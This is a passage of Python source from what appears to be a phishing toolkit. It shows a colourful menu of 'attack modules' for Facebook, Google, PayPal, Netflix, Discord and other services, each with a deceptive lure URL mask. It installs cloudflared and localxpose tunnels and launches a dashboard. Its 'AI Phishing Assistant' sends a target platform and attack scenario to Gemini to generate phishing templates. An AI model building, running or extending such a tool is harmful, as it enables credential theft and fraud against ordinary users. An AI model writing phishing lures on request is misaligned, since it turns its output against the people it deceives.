    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Linkedin      {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Quora
    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Adobe
    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex

    {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [16] Social Media Reels Video   [ NEW ]", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [17] AI Phishing Assistant      [ NEW ]", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [18] Open Web Dashboard         [ LIVE ]", RGB_PURPLE, RGB_CYAN)}
    {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_PURPLE, RGB_CYAN)}

    {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
    """)
    reply = slow_input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )

    opts = {
        "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "04": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "5": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "05": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "6": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "06": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "7": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "07": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "8": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "08": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "9": ("discord", "https://get-discord-nitro-free"),
        "09": ("discord", "https://get-discord-nitro-free"),
        "10": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
        "11": ("spotify", "https://convert-your-account-to-spotify-premium"),
        "12": ("reddit", "https://reddit-official-verified-member-badge"),
        "13": ("quora", "https://quora-premium-for-free"),
        "14": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
        "15": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
        "16": ("reels_video", "https://watch-viral-reels-video-trending"),
    }

    if reply in ["1", "01"]:
        glitch_print(
            " [+] LOADING FACEBOOK ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_facebook()
    elif reply in ["2", "02"]:
        glitch_print(
            " [+] LOADING INSTAGRAM ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_instagram()
    elif reply in ["3", "03"]:
        glitch_print(
            " [+] LOADING GOOGLE ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_gmail()
    elif reply in opts:
        global website, mask
        website, mask = opts[reply]
        glitch_print(
            f" [+] LOADING {website.upper()} ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        tunnel_menu()
    elif reply in ["17"]:
        ai_assistant_menu()
    elif reply in ["18"]:
        show_dashboard_info(from_attack=False)
    elif reply in ["99"]:
        about(main_menu)
    elif reply in ["0", "00"]:
        msg_exit()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()


def start_dashboard():
    """Start Flask dashboard in background and wait to confirm it's running."""
    import socket

    # Check if already running
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex(("localhost", 5000))
        s.close()
        if result == 0:
            slow_type(f"    [+] Dashboard already running at http://localhost:5000", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
            return
    except Exception:
        pass

    app_path = os.path.join(BASE_DIR, "dashboard/app.py")
    subprocess.Popen(
        [sys.executable, app_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
    )

    # Wait up to 8 seconds for it to be ready
    for _ in range(16):
        time.sleep(0.5)
        try:
            s = socket.socket()
            s.settimeout(1)
            result = s.connect_ex(("localhost", 5000))
            s.close()
            if result == 0:
                slow_type(f"    [+] Dashboard is LIVE at http://localhost:5000", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
                return
        except Exception:
            pass

    print(f"    {DARK}[{PINK}!{DARK}]{PINK} Dashboard may be slow to start. Try http://localhost:5000 manually.")


def ai_assistant_menu():
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    glitch_print(
        " --- AI PHISHING ASSISTANT --- ",
        duration=0.5,
        start_rgb=RGB_PINK,
        end_rgb=RGB_WHITE,
    )

    if not ai_assistant.setup_ai():
        print(f"\n    {DARK}[{WHITE}!{DARK}]{RED} Gemini API Key not found!")
        key = input(
            f"    {DARK}[{WHITE}-{DARK}]{LIGHT2} Please enter your Gemini API Key: {WHITE}"
        )
        if key:
            ai_assistant.save_api_key(key)
        else:
            main_menu()
            return

    platform_name = input(
        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Target Platform (e.g. Instagram): {WHITE}"
    )
    scenario = input(
        f"\n    {DARK}[{WHITE}?{DARK}]{LIGHT2} Attack Scenario (e.g. Account Security Alert): {WHITE}"
    )

    print()
    loading_animation(4, "AI is thinking")
    result = ai_assistant.generate_templates(platform_name, scenario)

    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
    )
    slow_type(result, speed=0.005, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
    )

    input(f"\n    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} to return to main menu...")
    main_menu()


if __name__ == "__main__":
    kill_pid()
    dependencies()
    check_status()
    setup_env()
    install_cloudflared()
    install_localxpose()
    start_dashboard()  # Start Web UI in background
    main_menu()
